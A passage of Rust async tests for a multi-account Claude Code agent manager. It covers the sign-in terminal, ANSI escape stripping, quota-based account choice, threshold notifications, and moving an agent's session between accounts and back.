    let e = status(&h, "parti").await.unwrap_err();
    assert_eq!(e.to_string(), "compte « parti » introuvable");
}

/// How many lines of a fake interface's log, and of an interface's screen, `views_report` tells.
const FAKE_LOG_LINES: usize = 12;
const SCREEN_LINES: usize = 25;

/// The last lines of what a terminal printed, as `plain_text` reads them, the empty ones left out.
fn screen_end(kept: &[u8]) -> String {
    let text = String::from_utf8_lossy(kept);
    let lines: Vec<String> = text
        .split('\n')
        // What a carriage return wrote over is gone from the screen.
        .map(|l| {
            l.rsplit('\r')
                .map(plain_text)
                .find(|p| !p.trim().is_empty())
                .unwrap_or_default()
        })
        .filter(|l| !l.trim().is_empty())
        .collect();
    let mut out = format!("screen ({} bytes), its end:\n", kept.len());
    for l in &lines[lines.len().saturating_sub(SCREEN_LINES)..] {
        out.push_str("  | ");
        out.push_str(&clip(l, 300));
        out.push('\n');
    }
    out
}

/// `s` cut to `max` characters at most.
fn clip(s: &str, max: usize) -> String {
    match s.char_indices().nth(max) {
        Some((at, _)) => format!("{}…", &s[..at]),
        None => s.to_string(),
    }
}

/// What a terminal printed, without its escape sequences nor its line ends (a pseudo-console
/// paints its screen with them).
pub(crate) fn plain_text(out: &str) -> String {
    let mut text = String::new();
    let mut chars = out.chars().peekable();
    while let Some(c) = chars.next() {
        match c {
            '\x1b' => match chars.next() {
                // CSI: up to its final letter.
                Some('[') => {
                    for c in chars.by_ref() {
                        if ('@'..='~').contains(&c) {
                            break;
                        }
                    }
                }
                // OSC: up to its bell or its string terminator.
                Some(']') => {
                    while let Some(c) = chars.next() {
                        if c == '\x07' || (c == '\x1b' && chars.next_if_eq(&'\\').is_some()) {
                            break;
                        }
                    }
                }
                _ => {}
            },
            '\r' | '\n' => {}
            c => text.push(c),
        }
    }
    text
}

#[tokio::test]
async fn an_accounts_sign_in_runs_its_claude_with_its_folder_in_a_terminal() {
    use crate::accounts::ShareMode;
    let h = harness("accounts-tab-login");
    let pro = h
        .core
        .create_claude_account("Pro", &[], ShareMode::Copy)
        .unwrap();
    // A `claude` that tells the folder it was given, its own update turned off (ESC-133), and on
    // Unix what opens its browser.
    let script = if cfg!(windows) {
        let s = h.dir.join("claude-login.cmd");
        std::fs::write(
            &s,
            "@echo off\r\necho config=[%CLAUDE_CONFIG_DIR%] update=[%DISABLE_AUTOUPDATER%]\r\n",
        )
        .unwrap();
        s
    } else {
        let s = h.dir.join("claude-login");
        std::fs::write(
            &s,
            "#!/bin/sh\necho \"config=[$CLAUDE_CONFIG_DIR] update=[$DISABLE_AUTOUPDATER] browser=[$BROWSER]\"\n",
        )
        .unwrap();
        #[cfg(unix)]
        {
            use std::os::unix::fs::PermissionsExt;
            std::fs::set_permissions(&s, std::fs::Permissions::from_mode(0o755)).unwrap();
        }
        s
    };
    h.core
        .update_claude_account(Account {
            claude_path: script.to_string_lossy().into(),
            ..pro.clone()
        })
        .unwrap();
    let out = Arc::new(parking_lot::Mutex::new(String::new()));
    let sink = out.clone();
    let info = h
        .core
        .claude_login("pro", (400, 30), move |b| {
            sink.lock().push_str(&String::from_utf8_lossy(&b))
        })
        .unwrap();
    assert_eq!(
        (
            info.name.as_str(),
            info.shell.as_str(),
            info.project_id.as_str()
        ),
        ("Pro", "claude", "")
    );
    let expected = if cfg!(windows) {
        format!("config=[{}] update=[1]", pro.config_dir)
    } else {
        // Escouade's opener, which starts the browser out of the terminal of the sign-in.
        format!(
            "config=[{}] update=[1] browser=[{}]",
            pro.config_dir,
            h.core.data.browser_opener().display()
        )
    };
    let start = std::time::Instant::now();
    let mut answered = false;
    while !plain_text(&out.lock()).contains(&expected) {
        // As xterm.js does in the window: the pseudo-console asks where the cursor is before it
        // runs anything.
        if !answered && out.lock().contains("\x1b[6n") {
            h.core.pty.write(&info.id, b"\x1b[1;1R").unwrap();
            answered = true;
        }
        assert!(
            start.elapsed() < Duration::from_secs(30),
            "{expected} not in {:?}",
            out.lock()
        );
        tokio::time::sleep(Duration::from_millis(20)).await;
    }
    // It ends with its program: the window is told.
    h.wait("its end", |h| {
        h.events
            .lock()
            .iter()
            .any(|e| e["type"] == "terminalExit" && e["id"] == json!(info.id))
    })
    .await;
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        let opener = std::fs::metadata(h.core.data.browser_opener()).unwrap();
        assert_eq!(opener.permissions().mode() & 0o777, 0o700);
    }
    // Its `claude` gone: said so.
    h.core
        .update_claude_account(Account {
            claude_path: h.dir.join("absent.exe").to_string_lossy().into(),
            ..pro.clone()
        })
        .unwrap();
    // With the command that puts it back (ESC-133); the sign-in that ended says the same.
    let e = h.core.claude_login("pro", (80, 24), |_| {}).unwrap_err();
    let said = e.to_string();
    assert!(
        said.starts_with("Claude Code est introuvable : réinstalle-le (")
            || said.starts_with("L’installation de Claude Code a été interrompue"),
        "{said}"
    );
    assert!(
        said.contains("`npm install -g @anthropic-ai/claude-code`"),
        "{said}"
    );
    assert_eq!(h.core.sign_in_ended("pro"), Some(said));
    let e = h.core.claude_login("parti", (80, 24), |_| {}).unwrap_err();
    assert_eq!(e.to_string(), "compte « parti » introuvable");
}

// ---------- Choosing the account ----------

/// Window of `pct` percent that ends in an hour.
fn used_for_an_hour(pct: f64) -> Option<RateWindow> {
    Some(RateWindow {
        pct,
        resets_at: Some(now_ms() + 3_600_000),
    })
}

/// The settings changed by `f` and saved, as the window does.
fn change_settings(h: &Harness, f: impl FnOnce(&mut Settings)) {
    let mut s = h.core.settings.read().clone();
    f(&mut s);
    h.core.save_settings(s).unwrap();
}

/// The project asks for the account (empty: any).
fn prefer(h: &Harness, p: &Project, account: &str) {
    let mut project = h.core.project(&p.id).unwrap();
    project.account = account.into();
    h.core.update_project(project).unwrap();
}

#[tokio::test]
async fn a_new_agent_goes_to_the_account_asked_for_then_the_projects_then_the_first_usable_one() {
    let h = harness("accounts-pick");
    let (p, _) = h.project(true).await;
    second_account(&h);
    let new_agent = || async { h.core.create_agent(&p.id, None).await.unwrap().meta.account };
    // Nothing read: the first account.
    assert_eq!(new_agent().await, "principal");
    // Principal used up until later: the next agents go to Pro.
    h.core.record_usage(
        "principal",
        Reading::claude((used_for_an_hour(100.0), None)),
    );
    assert_eq!(new_agent().await, "pro");
    // The one asked for comes first, whatever the quota.
    assert_eq!(agent_on(&h, &p, "principal").await.account, "principal");
    // The project's, when it names one.
    prefer(&h, &p, "principal");
    assert_eq!(new_agent().await, "principal");
    assert_eq!(agent_on(&h, &p, "pro").await.account, "pro");
    // One that is switched off, or gone: any account again.
    prefer(&h, &p, "pro");
    assert_eq!(new_agent().await, "pro");
    change_settings(&h, |s| s.accounts[1].active = false);
    assert_eq!(new_agent().await, "principal");
    prefer(&h, &p, "");
    assert_eq!(new_agent().await, "principal");
    // Every account used up: the first active one (the autopilot pauses).
    change_settings(&h, |s| s.accounts[1].active = true);
    h.core
        .record_usage("pro", Reading::claude((used_for_an_hour(100.0), None)));
    assert_eq!(new_agent().await, "principal");
}

#[tokio::test]
async fn a_project_keeps_its_preferred_account_only_among_the_accounts_there_are() {
    let h = harness("accounts-prefer");
    let (p, _) = h.project(false).await;
    second_account(&h);
    // An old project prefers none.
    assert_eq!(h.core.project(&p.id).unwrap().account, "");
    prefer(&h, &p, "pro");
    assert_eq!(h.core.project(&p.id).unwrap().account, "pro");
    // The window may send an account that is not (a copy older than the accounts' tab).
    prefer(&h, &p, "parti");
    assert_eq!(h.core.project(&p.id).unwrap().account, "");
    // An account removed is no longer preferred by anyone.
    prefer(&h, &p, "pro");
    h.core.remove_claude_account("pro").unwrap();
    assert_eq!(h.core.project(&p.id).unwrap().account, "");
}

#[tokio::test]
async fn an_agent_with_no_session_changes_account_and_its_warm_process_restarts_with_it() {
    let h = harness("accounts-set");
    // Its own worktree: its own log of launches.
    let (p, _) = h.project(true).await;
    let pro = second_account(&h);
    let a = h.core.create_agent(&p.id, None).await.unwrap().meta;
    let cwd = PathBuf::from(&a.cwd);
    h.wait("warm process", |h| config_dirs(h, &cwd).len() == 1)
        .await;
    assert_eq!(config_dirs(&h, &cwd), [Value::Null]);
    h.core.set_agent_account(&a.id, "pro").await.unwrap();
    assert_eq!(h.agent(&a.id).account, "pro");
    h.wait("process of the new account", |h| {
        config_dirs(h, &cwd).len() == 2
    })
    .await;
    assert_eq!(config_dirs(&h, &cwd), [Value::Null, json!(pro.config_dir)]);
    // The window was told.
    let told = h
        .events
        .lock()
        .iter()
        .rev()
        .find(|e| e["type"] == "agent" && e["agent"]["id"] == json!(a.id))
        .cloned()
        .unwrap();
    assert_eq!(told["agent"]["account"], "pro");
    // The same again: nothing restarts.
    h.core.set_agent_account(&a.id, "pro").await.unwrap();
    // « Automatique »: the first usable account, here Principal once Pro is used up.
    h.core
        .record_usage("pro", Reading::claude((used_for_an_hour(100.0), None)));
    h.core.set_agent_account(&a.id, "").await.unwrap();
    assert_eq!(h.agent(&a.id).account, "principal");
    // An account to go to, that is there and active.
    let unknown = h.core.set_agent_account(&a.id, "parti").await.unwrap_err();
    assert_eq!(unknown.to_string(), "compte « parti » introuvable");
    change_settings(&h, |s| s.accounts[1].active = false);
    let off = h.core.set_agent_account(&a.id, "pro").await.unwrap_err();
    assert_eq!(off.to_string(), "Le compte « Pro » est désactivé.");
    assert_eq!(h.agent(&a.id).account, "principal");
    // Its first message files its conversation in its account: it stays there.
    change_settings(&h, |s| s.accounts[1].active = true);
    h.turn(&a.id, "Bonjour").await;
    let refused = h.core.set_agent_account(&a.id, "pro").await.unwrap_err();
    assert_eq!(
        refused.to_string(),
        "Le compte d’un agent ne change plus après son premier message."
    );
    assert_eq!(h.agent(&a.id).account, "principal");
    // A copy resumes its original's session, filed in the original's account.
    let copy = h.core.duplicate_agent(&a.id).await.unwrap().meta;
    assert!(h.core.set_agent_account(&copy.id, "pro").await.is_err());
}

#[tokio::test]
async fn the_window_is_told_once_when_the_current_account_changes_because_it_passed_the_threshold()
{
    let h = harness("accounts-toast");
    second_account(&h);
    change_settings(&h, |s| s.quota_pause = 95);
    let toasts = |h: &Harness| -> Vec<String> {
        h.events
            .lock()
            .iter()
            .filter(|e| e["type"] == "toast")
            .map(|e| e["text"].as_str().unwrap().to_string())
            .collect()
    };
    let read = |account: &str, pct: f64| {
        h.core
            .record_usage(account, Reading::claude((used_for_an_hour(pct), None)))
    };
    read("principal", 90.0);
    assert!(toasts(&h).is_empty());
    // Past the threshold: the new agents go to Pro.
    read("principal", 96.0);
    assert_eq!(h.core.usage.lock().claude_current(), "pro");
    assert_eq!(
        toasts(&h),
        ["Le compte Principal a atteint 96 % : les nouveaux agents partent sur Pro."]
    );
    // Read again, used more: nothing changed, nothing said.
    read("principal", 99.0);
    read("pro", 10.0);
    assert_eq!(toasts(&h).len(), 1);
    // Pro past it too: every account is, the first one is the current again, said nowhere
    // (the autopilot's pause tells).
    read("pro", 97.0);
    assert_eq!(h.core.usage.lock().claude_current(), "principal");
    assert_eq!(toasts(&h).len(), 1);
    // Principal reads under it: the first usable one again, not told.
    read("principal", 20.0);
    assert_eq!(h.core.usage.lock().claude_current(), "principal");
    assert_eq!(toasts(&h).len(), 1);
    // Past it once more: said once more.
    read("pro", 10.0);
    read("principal", 100.0);
    assert_eq!(h.core.usage.lock().claude_current(), "pro");
    assert_eq!(toasts(&h).len(), 2);
    // A change of the settings that moves the current account (the one left passed the
    // threshold, Pro is switched off) does not say that it passed it.
    change_settings(&h, |s| s.accounts[1].active = false);
    assert_eq!(h.core.usage.lock().claude_current(), "principal");
    assert_eq!(toasts(&h).len(), 2);
}

#[tokio::test]
async fn a_question_about_no_agent_is_asked_of_the_account_a_new_agent_would_go_to() {
    let h = harness("accounts-ask");
    let (p, r) = h.project(false).await;
    let pro = second_account(&h);
    // Principal first; used up, the next one.
    h.core.suggest_worktree_steps(&p.id).await.unwrap();
    assert_eq!(config_dirs(&h, &r).last(), Some(&Value::Null));
    h.core.record_usage(
        "principal",
        Reading::claude((used_for_an_hour(100.0), None)),
    );
    h.core.suggest_worktree_steps(&p.id).await.unwrap();
    assert_eq!(config_dirs(&h, &r).last(), Some(&json!(pro.config_dir)));
    // The project's account, if it names one.
    prefer(&h, &p, "principal");
    h.core.suggest_worktree_steps(&p.id).await.unwrap();
    assert_eq!(config_dirs(&h, &r).last(), Some(&Value::Null));
}

#[tokio::test]
async fn claude_is_found_on_the_account_new_agents_would_go_to() {
    let h = harness("accounts-claude-found");
    let pro = second_account(&h);
    // Claude Code is nowhere for the settings, but Pro runs a `claude` of its own.
    let absent = h.dir.join("absent.cmd").to_string_lossy().to_string();
    change_settings(&h, |s| {
        s.claude_path = absent.clone();
        s.accounts[1].claude_path = fake_cli();
    });
    assert!(!h.core.claude_found());
    // Principal used up: Pro is the current account, and it has one.
    h.core.record_usage(
        "principal",
        Reading::claude((used_for_an_hour(100.0), None)),
    );
    assert!(h.core.claude_found());
    assert_eq!(h.core.usage.lock().claude_current(), pro.id);
    // Found for the settings: found for Principal.
    change_settings(&h, |s| {
        s.claude_path = fake_cli();
        s.accounts[1].claude_path = absent.clone();
    });
    assert!(!h.core.claude_found());
    h.core
        .record_usage("principal", Reading::claude((used_for_an_hour(10.0), None)));
    assert!(h.core.claude_found());
}

// ---------- Resuming on another account ----------

/// Another Claude account, `id`, its folder in the test's, put after the others in the settings.
pub(crate) fn extra_account(h: &Harness, id: &str, name: &str) -> Account {
    let account = Account {
        id: id.into(),
        name: name.into(),
        config_dir: h.dir.join(format!("claude-{id}")).to_string_lossy().into(),
        ..Default::default()
    };
    let mut s = h.core.settings.read().clone();
    s.accounts.push(account.clone());
    h.core.save_settings(s).unwrap();
    account
}

/// Pro out of quota for good (its folder holds a `fake-limit`), and Équipe, another account.
pub(crate) fn pro_out_of_quota_and_team(h: &Harness) -> (Account, Account) {
    let pro = second_account(h);
    let team = extra_account(h, "equipe", "Équipe");
    std::fs::create_dir_all(&pro.config_dir).unwrap();
    std::fs::write(Path::new(&pro.config_dir).join("fake-limit"), "").unwrap();
    (pro, team)
}

/// The files the account's folder keeps the session in (`projects/*/<session>.jsonl`).
fn kept_session(config_dir: &str, session: &str) -> Vec<PathBuf> {
    let Ok(folders) = std::fs::read_dir(Path::new(config_dir).join("projects")) else {
        return Vec::new();
    };
    folders
        .flatten()
        .map(|f| f.path().join(format!("{session}.jsonl")))
        .filter(|f| f.is_file())
        .collect()
}

#[tokio::test]
async fn an_agent_stopped_by_the_limit_resumes_on_another_account_with_its_session_once_its_process_is_gone(
) {
    let h = harness("accounts-resume-on");
    // In its worktree: its own log of launches and messages.
    let (p, _) = h.project(true).await;
    let (pro, team) = pro_out_of_quota_and_team(&h);
    let id = agent_on(&h, &p, "pro").await.id;
    // Stopped by the limit; its process takes a moment to end once its input is closed, and writes
    // its session to the last.
    turn_over(&h, &id, "Bonjour [ferme-lentement] la limite").await;
    h.wait("its resume planned", |h| h.agent(&id).resume_at.is_some())
        .await;
    let session = h.agent(&id).session_id.unwrap();
    assert_eq!(kept_session(&pro.config_dir, &session).len(), 1);
    assert!(kept_session(&team.config_dir, &session).is_empty());
    let old = h.core.agent(&id).unwrap().lock().proc.clone().unwrap();
    assert!(old.is_alive());

    h.core.resume_on_account(&id, "equipe").await.unwrap();

    // Never two processes on the session: the old one was gone before the session was copied.
    assert!(!old.is_alive());
    let m = h.agent(&id);
    assert_eq!(
        (m.account.as_str(), m.moved_from.as_deref(), m.resume_at),
        ("equipe", Some("pro"), None)
    );
    let cwd = PathBuf::from(&m.cwd);
    h.wait("the continue answered", |h| {
        h.stdin_messages(&cwd).len() == 2 && !h.agent(&id).status.is_active()
    })
    .await;
    // The same message as the automatic resume.
    assert_eq!(
        h.stdin_messages(&cwd).last().unwrap()["message"]["content"],
        "continue"
    );
    // Launched again with the other account's folder, resuming the same session.
    assert_eq!(
        config_dirs(&h, &cwd),
        [json!(pro.config_dir), json!(team.config_dir)]
    );
    assert!(h
        .launches(&cwd)
        .last()
        .unwrap()
        .contains(&format!("--resume={session}")));
    // The copy has what the old process wrote as it ended, and the new one's turn after it.
    let copy = kept_session(&team.config_dir, &session);
    assert_eq!(copy.len(), 1);
    let text = std::fs::read_to_string(&copy[0]).unwrap();
    let (closed, went_on) = (text.find("\"closed\""), text.find("continue"));
    assert!(closed.is_some() && closed < went_on, "{text}");
    // Copied, not moved.
    assert_eq!(kept_session(&pro.config_dir, &session).len(), 1);
    // The conversation tells it.
    assert!(
        h.items(&id).iter().any(|i| i["kind"] == "notice"
            && i["text"] == "L’agent reprend sur le compte Équipe (il était sur Pro)."),
        "{:?}",
        h.items(&id)
    );
}

#[tokio::test]
async fn a_resume_on_another_account_is_refused_where_it_cannot_be_and_changes_nothing() {
    let h = harness("accounts-resume-refused");
    let (p, _) = h.project(true).await;
    let (pro, _) = pro_out_of_quota_and_team(&h);
    let refusal = |id: &str, to: &str| {
        let core = h.core.clone();
        let (id, to) = (id.to_string(), to.to_string());
        async move {
            core.resume_on_account(&id, &to)
                .await
                .unwrap_err()
                .to_string()
        }
    };
    // Not started: no session to take along.
    let id = agent_on(&h, &p, "pro").await.id;
    assert_eq!(
        refusal(&id, "equipe").await,
        "Cette conversation n’a pas encore de session à reprendre."
    );
    turn_over(&h, &id, "la limite").await;
    // An account the settings do not know, one that is off, the agent's own.
    assert_eq!(refusal(&id, "parti").await, "compte « parti » introuvable");
    assert_eq!(
        refusal(&id, "pro").await,
        "L’agent tourne déjà sur le compte « Pro »."
    );
    let mut off = h.core.settings.read().accounts[2].clone();
    off.active = false;
    h.core.update_claude_account(off).unwrap();
    assert_eq!(
        refusal(&id, "equipe").await,
        "Le compte « Équipe » est désactivé."
    );
    let mut on = h.core.settings.read().accounts[2].clone();
    on.active = true;
    h.core.update_claude_account(on).unwrap();
    // The session is not in the folder of the agent's account: nothing is made on the other.
    let session = h.agent(&id).session_id.unwrap();
    for file in kept_session(&pro.config_dir, &session) {
        std::fs::remove_file(file).unwrap();
    }
    let said = refusal(&id, "equipe").await;
    assert!(
        said.starts_with(&format!("Session « {session} » introuvable")),
        "{said}"
    );
    assert!(!h.dir.join("claude-equipe").exists());
    let m = h.agent(&id);
    assert_eq!((m.account.as_str(), m.moved_from), ("pro", None));
    // At work: it finishes its turn first.
    let busy = agent_on(&h, &p, "pro").await.id;
    std::fs::remove_file(Path::new(&pro.config_dir).join("fake-limit")).unwrap();
    h.core
        .send_message(&busy, "slow".to_string(), vec![])
        .await
        .unwrap();
    h.wait("it works", |h| {
        let m = h.agent(&busy);
        m.status.is_active() && m.session_id.is_some()
    })
    .await;
    assert_eq!(
        refusal(&busy, "equipe").await,
        "L’agent travaille encore : reprends quand son tour est fini."
    );
    assert_eq!(h.agent(&busy).account, "pro");
    assert!(h.alive(&busy));
}

#[tokio::test]
async fn a_resume_that_fails_on_the_new_account_says_so_and_can_go_back_to_the_account_before() {
    let h = harness("accounts-resume-failed");
    let (p, _) = h.project(true).await;
    let (pro, team) = pro_out_of_quota_and_team(&h);
    // The other account answers with an error of the API (no sign-in, say).
    std::fs::create_dir_all(&team.config_dir).unwrap();
    std::fs::write(Path::new(&team.config_dir).join("fake-error"), "").unwrap();
    let id = agent_on(&h, &p, "pro").await.id;
    turn_over(&h, &id, "la limite").await;
    h.wait("its resume planned", |h| h.agent(&id).resume_at.is_some())
        .await;
    let session = h.agent(&id).session_id.unwrap();
    let planned = h.agent(&id).resume_at.unwrap();
    let turns = |h: &Harness| h.items(&id).iter().filter(|i| i["kind"] == "turn").count();
    assert_eq!(turns(&h), 1);

    h.core.resume_on_account(&id, "equipe").await.unwrap();
    // The reset it waited for is kept with where it came from, the move having dropped it.
    assert_eq!(h.agent(&id).moved_resume_at, Some(planned));
    h.wait("the failed turn", |h| {
        turns(h) == 2 && !h.agent(&id).status.is_active()
    })
    .await;
    // The failure is the turn's, and the agent remembers where it came from.
    let last = h
        .items(&id)
        .into_iter()
        .rfind(|i| i["kind"] == "turn")
        .unwrap();
    assert_eq!(last["isError"], true);
    assert_eq!(last["error"], "Invalid API key · Please run /login");
    assert_eq!(last["limited"], false);
    let m = h.agent(&id);
    assert_eq!(
        (m.account.as_str(), m.moved_from.as_deref()),
        ("equipe", Some("pro"))
    );

    // Pro's windows are no longer read (its quota could not be asked meanwhile): they would not
    // say when it resets.
    h.core.update_usage(|u| {
        let pro = u.account_mut("pro");
        pro.meters.clear();
    });
    // Back to Pro: the session goes back with what the failed turn added, the agent waits for
    // the reset it waited for as before, and it no longer says it came from anywhere.
    h.core.back_to_previous_account(&id).await.unwrap();
    let m = h.agent(&id);
    assert_eq!((m.account.as_str(), m.moved_from), ("pro", None));
    assert_eq!(m.resume_at, Some(planned));
    assert!(planned > now_ms(), "{planned}");
    assert_eq!(m.moved_resume_at, None);
    assert!(!h.alive(&id));
    let back = std::fs::read_to_string(&kept_session(&pro.config_dir, &session)[0]).unwrap();
    let there = std::fs::read_to_string(&kept_session(&team.config_dir, &session)[0]).unwrap();
    assert_eq!(back, there);
    // Nothing to go back to once back.
    assert_eq!(
        h.core
            .back_to_previous_account(&id)
            .await
            .unwrap_err()
            .to_string(),
        "Cet agent n’a pas changé de compte."
    );
}

#[tokio::test]
async fn the_account_an_agent_came_from_is_forgotten_once_a_turn_of_the_resume_ends_well() {
    let h = harness("accounts-resume-forgotten");
    let (p, _) = h.project(true).await;
    pro_out_of_quota_and_team(&h);
    let id = agent_on(&h, &p, "pro").await.id;
    turn_over(&h, &id, "la limite").await;
    h.core.resume_on_account(&id, "equipe").await.unwrap();
    assert_eq!(h.agent(&id).moved_from.as_deref(), Some("pro"));
    h.wait("the resume's turn", |h| {
        h.agent(&id).moved_from.is_none() && !h.agent(&id).status.is_active()
    })
    .await;
    assert_eq!(h.agent(&id).account, "equipe");
    assert_eq!(h.agent(&id).moved_resume_at, None);
    let last = h.items(&id).into_iter().rfind(|i| i["kind"] == "turn");
    assert_eq!(last.unwrap()["isError"], false);
}

/// A resume whose process on the new account ends before it starts, with `said` on its stderr: the
/// session is not orphaned (what a start that cannot find it would clear), the failure is the
/// resume's, and the way back is open.
async fn a_resume_that_exits_before_starting(name: &str, said: &str) {
    let h = harness(name);
    let (p, _) = h.project(true).await;
    let (pro, team) = pro_out_of_quota_and_team(&h);
    let id = agent_on(&h, &p, "pro").await.id;
    turn_over(&h, &id, "la limite").await;
    h.wait("its resume planned", |h| h.agent(&id).resume_at.is_some())
        .await;
    let before = h.agent(&id);
    let session = before.session_id.clone().unwrap();
    let planned = before.resume_at.unwrap();
    h.core.agent(&id).unwrap().lock().meta.last_entry = Some("entry-9".into());
    // Équipe's Claude Code ends at once.
    std::fs::create_dir_all(&team.config_dir).unwrap();
    std::fs::write(Path::new(&team.config_dir).join("fake-exit"), said).unwrap();

    // The message could not be sent: the process ended while starting.
    assert!(h.core.resume_on_account(&id, "equipe").await.is_err());
    h.wait("the failure", |h| !h.agent(&id).status.is_active())
        .await;
    let m = h.agent(&id);
    assert_eq!(
        (m.session_id.as_deref(), m.last_entry.as_deref()),
        (Some(session.as_str()), Some("entry-9"))
    );
    assert_eq!(
        (m.account.as_str(), m.moved_from.as_deref()),
        ("equipe", Some("pro"))
    );
    assert_eq!(m.status, AgentStatus::Error);
    // The card's turn: the failure of the resume, with what the process said.
    let last = h.items(&id).into_iter().last().unwrap();
    assert_eq!(last["kind"], "turn");
    assert_eq!(last["isError"], true);
    assert_eq!(last["limited"], false);
    assert_eq!(last["error"], said.trim());
    // Back to Pro: the session is there to go back with, and Pro's reset is waited for again.
    std::fs::remove_file(Path::new(&team.config_dir).join("fake-exit")).unwrap();
    h.core.back_to_previous_account(&id).await.unwrap();
    let m = h.agent(&id);
    assert_eq!((m.account.as_str(), m.moved_from), ("pro", None));
    assert_eq!(m.resume_at, Some(planned));
    assert_eq!(m.session_id.as_deref(), Some(session.as_str()));
    assert_eq!(kept_session(&pro.config_dir, &session).len(), 1);
}

#[tokio::test]
async fn a_resume_whose_session_the_new_account_cannot_find_keeps_it_and_tells_the_failure() {
    a_resume_that_exits_before_starting(
        "accounts-resume-exit-lost",
        "No conversation found with session ID: sess-1\n",
    )
    .await;
}

#[tokio::test]
async fn a_resume_whose_process_stops_on_a_sign_in_error_tells_the_failure_as_a_card() {
    a_resume_that_exits_before_starting(
        "accounts-resume-exit-auth",
        "Invalid API key · Please run /login\n",
    )
    .await;
}

#[tokio::test]
async fn going_back_waits_for_no_reset_when_the_automatic_resume_was_turned_off_meanwhile() {
    let h = harness("accounts-resume-back-off");
    let (p, _) = h.project(true).await;
    let (_, team) = pro_out_of_quota_and_team(&h);
    let id = agent_on(&h, &p, "pro").await.id;
    turn_over(&h, &id, "la limite").await;
    h.wait("its resume planned", |h| h.agent(&id).resume_at.is_some())
        .await;
    std::fs::create_dir_all(&team.config_dir).unwrap();
    std::fs::write(
        Path::new(&team.config_dir).join("fake-exit"),
        "Invalid API key\n",
    )
    .unwrap();
    assert!(h.core.resume_on_account(&id, "equipe").await.is_err());
    h.wait("the failure", |h| !h.agent(&id).status.is_active())
        .await;
    assert!(h.agent(&id).moved_resume_at.is_some());
    // Turned off: no resume waits any more, and none is brought back.
    let mut s = h.core.settings.read().clone();
    s.auto_resume = false;
    h.core.save_settings(s).unwrap();
    h.core.back_to_previous_account(&id).await.unwrap();
    let m = h.agent(&id);
    assert_eq!((m.account.as_str(), m.resume_at), ("pro", None));
}

#[tokio::test]
async fn a_message_sent_while_the_agent_moves_waits_for_the_move_and_goes_out_on_the_new_account() {
    let h = harness("accounts-resume-lock");
    let (p, _) = h.project(true).await;
    let (pro, team) = pro_out_of_quota_and_team(&h);
    let id = agent_on(&h, &p, "pro").await.id;
    // Its process takes 800 ms to end once its input is closed, and writes its session to the last.
    turn_over(&h, &id, "Bonjour [ferme-lentement] la limite").await;
    h.wait("its resume planned", |h| h.agent(&id).resume_at.is_some())
        .await;
    let session = h.agent(&id).session_id.unwrap();
    let cwd = PathBuf::from(h.agent(&id).cwd);
    let mover = {
        let (core, id) = (h.core.clone(), id.clone());
        tokio::spawn(async move { core.resume_on_account(&id, "equipe").await })
    };
    // The move has the agent: its old process is detached, and closing.
    h.wait("the move under way", |h| !h.alive(&id)).await;
    // A message now must not start a process on the old account, which still is the agent's: it
    // waits for the move, and goes out on the new one.
    h.core
        .send_message(&id, "Pendant".to_string(), vec![])
        .await
        .unwrap();
    mover.await.unwrap().unwrap();
    h.wait("both messages answered", |h| {
        h.stdin_messages(&cwd).len() == 3 && !h.agent(&id).status.is_active()
    })
    .await;
    let sent: Vec<Value> = h
        .stdin_messages(&cwd)
        .iter()
        .map(|m| m["message"]["content"].clone())
        .collect();
    assert!(sent.contains(&json!("Pendant")) && sent.contains(&json!("continue")));
    // Two processes in all: Pro's, then Équipe's, which has both.
    assert_eq!(
        config_dirs(&h, &cwd),
        [json!(pro.config_dir), json!(team.config_dir)]
    );
    // And the session it resumed has what the old process wrote as it ended.
    let text = std::fs::read_to_string(&kept_session(&team.config_dir, &session)[0]).unwrap();
    assert!(text.contains("\"closed\""), "{text}");
}

#[tokio::test]
async fn an_agent_that_is_no_tickets_stays_on_its_account_at_the_limit_and_waits_for_the_reset() {
    let h = harness("accounts-limit-no-ticket");
    let (p, _) = h.project(true).await;
    pro_out_of_quota_and_team(&h);
    // The move is switched on (it is off by default): it is still for the tickets' agents alone.
    h.core.settings.write().switch_on_limit = true;
    let id = agent_on(&h, &p, "pro").await.id;
    turn_over(&h, &id, "Bonjour").await;
    h.wait("its resume planned", |h| h.agent(&id).resume_at.is_some())
        .await;
    // The move is for the tickets' agents: a conversation is the user's to move, from its card.
    tokio::time::sleep(Duration::from_millis(500)).await;
    let m = h.agent(&id);
    assert_eq!((m.account.as_str(), m.moved_from), ("pro", None));
    assert!(m.resume_at.is_some());
    assert_eq!(config_dirs(&h, Path::new(&m.cwd)).len(), 1);
}

#[tokio::test]
async fn the_account_an_agent_came_from_is_forgotten_when_the_account_it_went_to_is_at_the_limit_too(
) {
    let h = harness("accounts-resume-limited-again");
    let (p, _) = h.project(true).await;
    let (_, team) = pro_out_of_quota_and_team(&h);
    std::fs::create_dir_all(&team.config_dir).unwrap();
    std::fs::write(Path::new(&team.config_dir).join("fake-limit"), "").unwrap();
    let id = agent_on(&h, &p, "pro").await.id;
    turn_over(&h, &id, "la limite").await;
    h.core.resume_on_account(&id, "equipe").await.unwrap();
    // The limit again, there: no failure of the resume, but one more limit to wait for.
    h.wait("the limit met again", |h| {
        h.items(&id).iter().filter(|i| i["kind"] == "turn").count() == 2
            && !h.agent(&id).status.is_active()
    })
    .await;
    let m = h.agent(&id);
    assert_eq!((m.account.as_str(), m.moved_from), ("equipe", None));
    assert!(m.resume_at.is_some());
    let last = h.items(&id).into_iter().rfind(|i| i["kind"] == "turn");
    assert_eq!(last.unwrap()["limited"], true);
}

#[tokio::test]
async fn the_order_of_the_harnesses_is_the_backends_and_lists_each_one_once() {
    let h = harness("esc30-engine-order");
    let order = h
        .core
        .set_engine_order(&[EngineId::CODEX, EngineId::CODEX])
        .unwrap();
    assert_eq!(order, [EngineId::CODEX, EngineId::CLAUDE]);
    // The window's settings, saved with the order it had before, do not change it: the tab of
    // the accounts sets it on its own, as it does the accounts.
    let mut s = h.core.settings.read().clone();
    s.engine_order = vec![EngineId::CLAUDE];
    h.core.save_window_settings(s).unwrap();
    assert_eq!(
        h.core.settings.read().engine_order,
        [EngineId::CODEX, EngineId::CLAUDE]
    );
}

#[tokio::test]
async fn the_written_texts_go_to_claude_code_while_it_is_the_only_harness_found_whatever_is_chosen()
{
    let h = harness("writer-engine");
    let (p, r) = h.project(false).await;
    // Settings saved before the choice: none, Claude Code's by default.
    assert_eq!(h.core.settings.read().writer_engine, None);
    let asked = |h: &Harness| h.launches(&r).last().cloned().unwrap_or_default();
    h.core.suggest_worktree_steps(&p.id).await.unwrap();
